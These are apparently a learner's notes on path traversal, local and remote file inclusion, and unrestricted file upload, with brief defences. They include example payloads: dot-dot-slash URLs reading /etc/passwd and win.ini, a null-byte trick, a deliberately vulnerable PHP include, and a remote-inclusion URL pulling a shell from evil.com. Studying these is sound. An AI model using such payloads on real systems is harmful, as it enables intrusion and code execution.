# Path traversal
- web app need to access resources in the file system to implement the web app such as ( images , text and so son )
- web app use parameters to define resources
- when these parameters are user-controlled and not probebly sanitized security isuues may rise
- the dot-dot-slash Attack
  - `http://www.elsfoo.com/getFile?path=../../../etc/passwd` : Linux --> /
  - `http://www.elsfoo.com/getFile?path=../../../windows/win.ini` : Windows ->\ , /
  - `http://www.elsfoo.com/getFile?path=../../../windows/boot.ini` : Windows
- depending on os root folder can be located :
  - *NIX -- > `/`
  - Windows -- >`<Driver letter>:\`
- to move up a directory use `../`
- terminate the current file name. : `%00`, does not work with PHP versions >= 5.3.4
	- `file_read ("/htdocs/website/reports/" user_input + ".pdf");`
- URL encoding, 16-bit Unicode
- Best defensive Techniques
	- Filter any malicious sequences from the input parameters
# File Inclusion Vulnerabilities 
- File inclusion vulnerabilities are divided in Remote and Local
- LFI : include Function
```
<?php
include("loc/" . $_GET['location']);
?>
```
- these vulunurabilty often found in CMS
- Remote File Inclusion
  - Work the same way as LFI
  - only diff is that the file included is pulled remotely
  - our aim is not to read but to include code execute
  - `vuln.php?page=http://evil.com/shell.txt`
  - In this case, shell.txt (containing PHP code)
  - It is important to know that the file included must not have the .php extension, otherwise the code within the included file will run on the attacker machine
  - RFI is possible because the allow_url_include directive is set to On within php.ini. It is good practice to set it to Off.
# Unrestricted File Upload
- vulunerabilty that affects web apps that allow the upload of files without enforcig restrictive policies
  - Max File size (DOS)
  - nature of file (image , pdf and xls )
- a malicous user can acquire complete control of the system
- For the application to be vulnerable :
  - The file type is not checked against a whitelist of allowed formats
  - The file name and path of the uploaded file is known to the attacker or guessable
  - The folder in which the file is placed allows the execution of server-side scripts
- Best Defense : A web developer should inspect the uploaded file at two different layers:
  - METADATA (name, extension, size, etc.)
  - ACTUAL CONTENT
  - Enforcing a whitelist (or blacklist)
- Watch Video
